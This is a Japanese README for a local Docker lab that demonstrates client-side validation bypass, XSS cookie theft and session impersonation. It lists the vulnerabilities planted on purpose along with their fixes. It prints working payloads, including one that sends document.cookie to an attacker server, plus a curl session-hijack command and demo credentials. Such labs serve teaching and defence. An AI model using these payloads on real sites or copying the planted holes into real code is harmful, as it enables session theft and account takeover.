# XSS デモ環境

フロントのバリデーション突破・XSSによるCookie窃取・なりすましを、ローカルDockerで再現する学習用環境。

---

## 構成

```
ブラウザ
  └── localhost:80 (Nginx)
        ├── /       → frontend (React + Vite)  :5173
        └── /api/   → backend  (FastAPI)        :8000

localhost:9000 → attacker (攻撃者サーバー / FastAPI)
```

### コンテナ一覧

| コンテナ | 役割 | 公開ポート |
|---|---|---|
| nginx | リバースプロキシ（同一オリジン化） | 80 |
| frontend | React フォーム画面 | なし（nginx経由） |
| backend | 認証・API | なし（nginx経由） |
| attacker | Cookie窃取を受け取る攻撃者サーバー | 9000 |

### 意図的に仕込んだ脆弱性

| 箇所 | 脆弱な実装 | 本来の対策 |
|---|---|---|
| `frontend/src/App.tsx` | `dangerouslySetInnerHTML` でユーザー入力をそのまま描画 | JSXの `{}` で表示（自動エスケープ） |
| `backend/main.py` | `httponly=False` でJSからCookieを読める | `httponly=True` |
| フロントバリデーション | クライアント側のみ | サーバー側でも検証 |

---

## 起動

```bash
docker-compose up --build
```

- 被害者画面: http://localhost
- 攻撃者ログ: http://localhost:9000/log

---

## 認証情報

```
ユーザー名: admin
パスワード:  password123
```

---

## XSS 再現手順

### Step 1: 正規ログインでCookieを発行させる

フォームに正しい認証情報を入力して送信する。  
バックエンドが `session_id=abc123_secret_token` をCookieにセットする。

### Step 2: XSSペイロードを送り込む

フォームのいずれかのフィールドに以下を入力して送信する（認証は失敗するが、XSSは発火する）。

**動作確認用（alertでCookieを表示）**
```
<img src=x onerror="alert('Cookie: ' + document.cookie)">
```

→ `session_id=abc123_secret_token` を含むCookieがalertに表示される。

**Cookie窃取用（攻撃者サーバーへ送信）**
```
<img src=x onerror="new Image().src='http://localhost:9000/steal?c='+encodeURIComponent(document.cookie)">
```

→ 攻撃者サーバーのターミナルに `[!!!] Cookie窃取成功: session_id=abc123_secret_token` と表示される。

### Step 3: 窃取したCookieでなりすまし

```bash
curl -b "session_id=abc123_secret_token" http://localhost:80/api/me
```

レスポンス:
```json
{"username": "admin", "email": "admin@example.com", "role": "admin"}
```

id/pw を知らなくても、被害者のセッションで本人になりきれる。

### Step 4: 窃取ログを確認

```
http://localhost:9000/log
```

攻撃者サーバーが受け取ったCookieの一覧が表示される。

---

## なぜ同一オリジンが必要か

Nginxでフロント・バックを `localhost:80` に統一しているのは、Cookie窃取を成立させるため。

- **別オリジン構成**（フロント:5173、バック:8000）の場合、バックがセットしたCookieはフロントのJSから読めない
- **同一オリジン構成**（どちらも:80）にすることで `document.cookie` にCookieが現れ、XSSで読み取り可能になる

---

## API一覧

| メソッド | パス | 説明 |
|---|---|---|
| POST | /api/login | 認証（admin/password123が正解） |
| POST | /api/submit | フォーム送信（Cookieを発行） |
| GET | /api/me | Cookie認証でユーザー情報を返す |
| GET | /api/health | ヘルスチェック |
| GET | localhost:9000/steal | Cookie窃取エンドポイント（攻撃者側） |
| GET | localhost:9000/log | 窃取済みCookieの一覧（攻撃者側） |
